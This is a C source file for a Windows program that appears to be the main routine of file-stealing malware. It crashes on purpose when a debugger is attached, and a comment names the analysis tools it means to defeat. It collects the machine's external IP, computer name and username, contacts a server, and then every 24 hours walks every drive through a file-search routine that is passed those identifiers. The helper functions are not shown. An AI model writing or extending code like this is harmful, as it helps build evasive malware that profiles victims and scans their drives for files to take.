#include "commun.h"

#define BUFFER_SIZE 1024




int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    
    
    if (IsDebuggerPresentEx()) {
        int* crashPointer = NULL;
        *crashPointer = 42; // This will cause a crash
    }
    
    // anti malware-analysis ida, process hacker, sysinternals, xdbg, windbg, ....


    char ip[16] = { 0 };
    get_external_ip(ip);

    // Get computer name and username
    char computerName[MAX_PATH];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    char username[MAX_PATH];
    size = sizeof(username);
    GetUserNameA(username, &size);

    // Create a JSON Initial meta data
    char InitMeta[1024];
    sprintf(
        InitMeta,
        "{\n"
        "    \"ip\": \"%s\",\n"
        "    \"computerName\": \"%s\",\n"
        "    \"userName\": \"%s\"\n"
        "}\n",
        ip,
        computerName,
        username
    );

    // Print the JSON Initial meta data
    printf("\n%s\n", InitMeta);

    ConnectToServer(ip, computerName, username);
    while (true) {
        char logicalDrives[MAX_PATH * 4] = { 0 };
        GetLogicalDriveStringsA(MAX_PATH * 4, logicalDrives);

        int fileCount = 0;

        char* drive = logicalDrives;
        while (*drive) {
            //printf("\n\n\n=====================================\n");
            //printf("[+] Searching in drive: %s", drive);
            //printf("\n=====================================\n\n\n");

            // Removing trailing backslash
            size_t driveLen = strlen(drive);
            if (drive[driveLen - 1] == '\\') {
                drive[driveLen - 1] = '\0';
            }

            findFiles(drive, &fileCount, ip, computerName, username);
            drive += driveLen + 1;
        }

        //printf("\n\n\n[+] Total files found: %d\n\n", fileCount);
        Sleep(24 * 60 * 60 * 1000);

    }
	return 0;
}